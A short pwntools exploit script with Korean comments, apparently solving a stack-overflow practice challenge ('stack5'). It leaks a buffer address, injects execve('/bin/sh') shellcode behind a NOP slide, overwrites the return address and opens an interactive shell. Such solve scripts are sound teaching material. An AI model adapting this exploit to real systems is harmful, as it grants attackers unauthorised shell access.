from pwn import *  # 익스플로잇 개발에 필요한 pwntools 라이브러리 임포트

p = process('./stack5')  # stack5 프로그램 실행

context.arch = 'amd64'  # 64비트 아키텍처 설정

# /bin/sh를 실행하는 쉘코드 생성
shellcode = shellcraft.execve('/bin/sh', 0, 0)
shellcode = asm(shellcode)  # 쉘코드를 어셈블리로 변환

# 버퍼 주소 수신
p.recvuntil(b': ')  # "Address of the buffer: " 문자열까지 수신
buf_addr = int(p.recvline().strip(), 16)  # 버퍼 주소를 16진수로 변환

# 페이로드 구성
payload = b'\x90' * (0x28 - len(shellcode))  # NOP 슬라이드로 쉘코드 앞 공간 채우기
payload += shellcode  # 쉘코드 추가
payload += b'\x90' * 0x20  # NOP 슬라이드로 쉘코드 뒤 공간 채우기
payload += p64(buf_addr)  # 버퍼 주소를 리틀 엔디안으로 패킹하여 추가 (리턴 주소 덮어쓰기)

p.sendline(payload)  # 페이로드를 프로그램에 전송

p.interactive()  # 익스플로잇 후 세션 시작